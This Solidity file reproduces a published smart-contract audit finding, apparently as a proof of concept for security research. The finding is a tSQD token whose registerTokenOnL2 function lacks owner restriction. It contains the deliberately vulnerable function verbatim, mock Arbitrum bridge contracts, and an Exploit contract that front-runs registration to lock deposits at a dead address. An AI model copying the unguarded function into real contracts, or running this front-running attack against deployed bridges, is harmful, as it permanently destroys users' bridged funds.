// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.27;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of Subsquid finding 58248 (H-04):
// "Lack of access control on tSQD's `registerTokenOnL2`".
//
// Real audited source (the vulnerable function is reproduced VERBATIM from the
// finding's embedded snippet; the vulnerable line is marked @>):
//   protocol Subsquid (tSQD)
//   report   github.com/pashov/audits/blob/master/team/md/Subsquid-security-review.md
//   fn       tSQD.registerTokenOnL2  (Arbitrum generic-custom gateway registration)
//
// Root cause: `registerTokenOnL2` is `public payable` with NO owner/admin
// restriction (the @> line has no `onlyOwner` modifier). Arbitrum's custom
// bridge design requires the L1 token itself to register its L2 counterpart
// exactly once, and the mapping is one-way ("NO_UPDATE_TO_DIFFERENT_ADDR").
// Because anyone can call this, an attacker front-runs the legitimate
// registration and supplies a WRONG `l2CustomTokenAddress`. The gateway locks
// tSQD to that wrong address permanently; the true owner can never correct it,
// so every future bridge deposit is routed to the wrong L2 token and lost.
//
// The vulnerable function body is byte-for-byte the report snippet. The gateway
// and router are faithful minimal doubles: `registerTokenToL2` records the L1→L2
// mapping and enforces Arbitrum's real "cannot update to a different address"
// invariant; `outboundTransfer` faithfully escrows the depositor's L1 tokens and
// forwards them to the registered (attacker-chosen, dead) L2 destination — so
// the bridged value ends up permanently stuck at that address.
// ─────────────────────────────────────────────────────────────────────────────

/// @dev Arbitrum L1 custom gateway interface used by the verbatim vulnerable line.
interface IL1CustomGateway {
    function registerTokenToL2(
        address _l2Address,
        uint256 _maxGas,
        uint256 _gasPriceBid,
        uint256 _maxSubmissionCost,
        address _creditBackAddress
    ) external payable returns (uint256);
}

/// @dev Arbitrum L1 gateway router interface used by the verbatim vulnerable line.
interface IL1GatewayRouter {
    function setGateway(
        address _gateway,
        uint256 _maxGas,
        uint256 _gasPriceBid,
        uint256 _maxSubmissionCost,
        address _creditBackAddress
    ) external payable returns (uint256);
}

interface IERC20Like {
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

/// @dev Faithful double of Arbitrum's L1CustomGateway. It records the L2
///      counterpart for the calling L1 token and enforces the real one-way
///      invariant: once set, the mapping can only be re-written to the SAME
///      address, so a wrong first registration is irreversible.
contract L1CustomGateway is IL1CustomGateway {
    mapping(address => address) public l1ToL2Token; // l1Token => l2Token

    function registerTokenToL2(
        address _l2Address,
        uint256, // _maxGas
        uint256, // _gasPriceBid
        uint256, // _maxSubmissionCost
        address // _creditBackAddress
    ) external payable returns (uint256) {
        address l1Token = msg.sender; // the L1 token registers itself
        // Arbitrum L1CustomGateway invariant: cannot repoint to a different L2 addr.
        require(
            l1ToL2Token[l1Token] == address(0) || l1ToL2Token[l1Token] == _l2Address,
            "NO_UPDATE_TO_DIFFERENT_ADDR"
        );
        l1ToL2Token[l1Token] = _l2Address;
        return 0;
    }

    /// @notice Faithful bridge deposit: escrow the depositor's L1 tokens and
    ///         route them to the registered L2 destination. If that destination
    ///         is the attacker's wrong (dead) address, the value is unrecoverable.
    function outboundTransfer(address l1Token, address, /*to*/ uint256 amount) external returns (uint256) {
        address dest = l1ToL2Token[l1Token];
        require(dest != address(0), "NOT_REGISTERED");
        IERC20Like(l1Token).transferFrom(msg.sender, dest, amount);
        return amount;
    }
}

/// @dev Faithful minimal double of Arbitrum's L1GatewayRouter.setGateway.
contract L1GatewayRouter is IL1GatewayRouter {
    mapping(address => address) public l1TokenToGateway; // l1Token => gateway

    function setGateway(
        address _gateway,
        uint256, // _maxGas
        uint256, // _gasPriceBid
        uint256, // _maxSubmissionCost
        address // _creditBackAddress
    ) external payable returns (uint256) {
        l1TokenToGateway[msg.sender] = _gateway;
        return 0;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE contract — the tSQD L1 token. `registerTokenOnL2` is reproduced
// VERBATIM from the audited source (finding 58248 embedded snippet).
// ─────────────────────────────────────────────────────────────────────────────
contract tSQD {
    // ── faithful minimal ERC20 (tSQD is the bridged asset) ──
    string public name = "Subsquid";
    string public symbol = "tSQD";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    // ── bridge wiring (set at deploy; there is a privileged owner, but the
    //    vulnerable function below never checks it — that is the bug) ──
    IL1CustomGateway public gateway;
    IL1GatewayRouter public router;
    address public owner;
    bool public shouldRegisterGateway;

    constructor(IL1CustomGateway gateway_, IL1GatewayRouter router_, address owner_) {
        gateway = gateway_;
        router = router_;
        owner = owner_;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    // ── VERBATIM vulnerable function from the audited tSQD source ──
    function registerTokenOnL2(
        address l2CustomTokenAddress,
        uint256 maxSubmissionCostForCustomGateway,
        uint256 maxSubmissionCostForRouter,
        uint256 maxGasForCustomGateway,
        uint256 maxGasForRouter,
        uint256 gasPriceBid,
        uint256 valueForGateway,
        uint256 valueForRouter,
        address creditBackAddress
    ) public payable { // @> VULN: no onlyOwner/admin restriction — anyone can front-run and register a wrong L2 token address
        require(!shouldRegisterGateway, "ALREADY_REGISTERED");
        shouldRegisterGateway = true;

        gateway.registerTokenToL2{value: valueForGateway}(
            l2CustomTokenAddress, maxGasForCustomGateway, gasPriceBid, maxSubmissionCostForCustomGateway, creditBackAddress
        );

        router.setGateway{value: valueForRouter}(
            address(gateway), maxGasForRouter, gasPriceBid, maxSubmissionCostForRouter, creditBackAddress
        );

        shouldRegisterGateway = false;
    }
}

/// @dev Minimal honest bridge user: approves the gateway and performs the deposit.
contract BridgeUser {
    tSQD internal token;
    L1CustomGateway internal gateway;

    constructor(tSQD token_, L1CustomGateway gateway_) {
        token = token_;
        gateway = gateway_;
    }

    function bridge(uint256 amount) external {
        token.approve(address(gateway), type(uint256).max);
        gateway.outboundTransfer(address(token), address(this), amount);
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver: an unprivileged attacker (NOT the owner) front-runs and
// registers a WRONG/dead L2 address. This bricks the bridge permanently:
//   - the true owner can no longer register the correct L2 address, and
//   - all future bridge deposits are routed to the dead address and lost.
// The harm magnitude (stuck bridge value) is realized at the canonical SINK.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    // canonical harm sink (also the "wrong" L2 address the attacker registers:
    // a dead address is the most damaging incorrect value — anything sent there
    // is permanently unrecoverable). Per the finding: attacker inputs an
    // incorrect `l2CustomTokenAddress`.
    address internal constant SINK = address(0xD00d);

    // the address the legitimate owner intended to register
    address internal constant CORRECT_L2 = address(0xC0FFEE);

    uint256 internal constant STUCK_AMOUNT = 1000e18; // an honest user's bridge deposit that gets lost

    address public constant OWNER = address(0xBEEF); // legitimate protocol owner (distinct from attacker)

    L1CustomGateway public gateway;
    L1GatewayRouter public router;
    tSQD public token; // VULN contract
    BridgeUser public user;

    address public registeredL2; // what the bridge is locked to after the attack
    bool public ownerFixReverted; // owner could not repoint to the correct addr
    uint256 public stuckAtSink; // bridged value permanently lost at the wrong dest

    constructor() {
        gateway = new L1CustomGateway(); // child nonce 1
        router = new L1GatewayRouter(); // child nonce 2
        token = new tSQD(gateway, router, OWNER); // child nonce 3 (VULN)
        user = new BridgeUser(token, gateway); // child nonce 4
    }

    function run() external {
        // 1) Unprivileged attacker (this contract, NOT the owner) front-runs and
        //    registers a wrong/dead L2 address. Succeeds — registerTokenOnL2 has
        //    no access control.
        token.registerTokenOnL2(
            SINK, // l2CustomTokenAddress = attacker's incorrect (dead) address
            0, 0, 0, 0, 0, 0, 0,
            address(this) // creditBackAddress
        );
        registeredL2 = gateway.l1ToL2Token(address(token));

        // 2) The legitimate owner tries to register the CORRECT L2 address. The
        //    gateway is now locked to the wrong address, so this reverts — the
        //    bridge can never be fixed.
        try token.registerTokenOnL2(CORRECT_L2, 0, 0, 0, 0, 0, 0, 0, OWNER) {
            ownerFixReverted = false;
        } catch {
            ownerFixReverted = true;
        }

        // 3) An honest user bridges STUCK_AMOUNT tSQD. The misconfigured gateway
        //    routes the escrowed tokens to the dead address the attacker set, so
        //    the user's funds are permanently lost (they land at SINK).
        token.mint(address(user), STUCK_AMOUNT);
        user.bridge(STUCK_AMOUNT);
        stuckAtSink = token.balanceOf(SINK);

        // ── concrete HARM ──
        require(registeredL2 == SINK, "attacker did not lock the wrong L2 address");
        require(ownerFixReverted, "owner was able to fix the registration");
        require(stuckAtSink == STUCK_AMOUNT, "bridged value not stuck at wrong destination");
    }
}
